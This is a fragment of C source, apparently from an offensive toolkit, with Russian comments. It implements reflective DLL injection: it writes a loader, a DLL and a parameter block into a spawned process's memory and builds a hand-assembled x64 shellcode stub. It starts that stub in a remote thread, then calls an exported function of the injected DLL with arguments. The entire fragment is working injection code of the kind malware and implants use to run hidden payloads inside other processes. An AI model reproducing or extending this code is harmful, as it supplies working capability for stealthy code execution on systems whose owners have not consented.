    SIZE_T loader_entry_off = 0, loader_sz = 0;
    PVOID remote_loader = write_loader_remote(pi.hProcess, &loader_entry_off, &loader_sz);
    if (!remote_loader) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(hRead);
        const char e[] = "inject_dll: write loader failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    dlog_hex("[*] remote_loader  =", (ULONGLONG)(uintptr_t)remote_loader);
    dlog_dec("[*] loader_sz      =", loader_sz);
    dlog_dec("[*] loader_entry_off =", loader_entry_off);

    PVOID remote_dll = write_dll_remote(pi.hProcess, dll_bytes, dll_len);
    if (!remote_dll) {
        nt_free_remote(pi.hProcess, remote_loader);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(hRead);
        const char e[] = "inject_dll: write DLL failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    dlog_hex("[*] remote_dll     =", (ULONGLONG)(uintptr_t)remote_dll);

    PVOID remote_param = write_param_remote(pi.hProcess,
                                            remote_dll, dll_len,
                                            remote_loader, loader_sz, loader_entry_off);
    if (!remote_param) {
        nt_free_remote(pi.hProcess, remote_dll);
        nt_free_remote(pi.hProcess, remote_loader);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(hRead);
        const char e[] = "inject_dll: write LOADER_PARAM failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    dlog_hex("[*] remote_param   =", (ULONGLONG)(uintptr_t)remote_param);

    // Фаза 1: Co2H_ReflectiveLoader маппирует DLL, вызывает DllMain
    PVOID entry = (uint8_t*)remote_loader + loader_entry_off;
    dlog_hex("[*] loader entry   =", (ULONGLONG)(uintptr_t)entry);

    // Собираем мини-стаб: mov rcx, param; mov rax, entry; call rax; ret
    uint8_t loader_stub[31];
    {
        int p = 0;
        loader_stub[p++] = 0x48; loader_stub[p++] = 0x83;
        loader_stub[p++] = 0xEC; loader_stub[p++] = 0x28;  // sub rsp, 0x28
        loader_stub[p++] = 0x48; loader_stub[p++] = 0xB9;  // mov rcx, imm64
        *(uint64_t*)(loader_stub + p) = (uint64_t)(uintptr_t)remote_param; p += 8;
        loader_stub[p++] = 0x48; loader_stub[p++] = 0xB8;  // mov rax, imm64
        *(uint64_t*)(loader_stub + p) = (uint64_t)(uintptr_t)entry; p += 8;
        loader_stub[p++] = 0xFF; loader_stub[p++] = 0xD0;  // call rax
        loader_stub[p++] = 0x48; loader_stub[p++] = 0x83;
        loader_stub[p++] = 0xC4; loader_stub[p++] = 0x28;  // add rsp, 0x28
        loader_stub[p++] = 0xC3;                            // ret
    }

    HANDLE hLoaderThread = NULL; void* rbase_ldr = NULL;
    uint32_t rc = kit_inject(pi.hProcess, pi.dwProcessId, 0 /* THREAD */,
                             loader_stub, sizeof(loader_stub),
                             NULL, 0, &hLoaderThread, NULL, &rbase_ldr);
    if (rc != 0 || !hLoaderThread) {
        nt_free_remote(pi.hProcess, remote_param);
        nt_free_remote(pi.hProcess, remote_dll);
        nt_free_remote(pi.hProcess, remote_loader);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(hRead);
        const char e[] = "inject_dll: kit_inject (loader) failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    dlog("[*] loader launched via kit, waiting...\n");

    DWORD wait_rc = WaitForSingleObject(hLoaderThread, 60000);
    dlog_hex("[*] WaitForSingleObject rc =", wait_rc);

    DWORD loader_exit = 0xDEADBEEF;
    GetExitCodeThread(hLoaderThread, &loader_exit);
    dlog_dec("[*] loader exit code =", loader_exit);
    // 0=ok, 1=bad param, 2=no kernel32, 3=no APIs, 4=bad DOS, 5=bad PE,
    // 6=no memory, 7=LoadLibrary failed, 8=GetProcAddress failed

    drain_available(hRead);
    CloseHandle(hLoaderThread);

    // Читаем LOADER_PARAM из удалённого процесса
    LOADER_PARAM lp;
    rt_memset(&lp, 0, sizeof(lp));
    nt_read(pi.hProcess, remote_param, &lp, sizeof(lp));
    dlog_hex("[*] out_module_base =", (ULONGLONG)(uintptr_t)lp.out_module_base);
    // Если значение < 1000 — это STEP-маяк (лоадер упал, не достроился до image base)

    // Фаза 2: вызов экспорта с командной строкой
    if (export_rva && args_bytes && args_len > 0 && lp.out_module_base
        && (uintptr_t)lp.out_module_base > 0x10000) {
        dlog("[*] phase 2: calling export\n");
        call_export_remote(pi.hProcess, pi.dwProcessId, hRead,
                           lp.out_module_base, export_rva,
                           (const char*)args_bytes, args_len);
    } else {
        if (export_rva && args_bytes && args_len > 0) {
            dlog("[!] skip export: out_module_base looks like STEP marker (loader failed)\n");
        }
        drain_pipe(hRead, NULL, 5000);
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    dlog("[*] inject_dll: PATH B done\n");
}
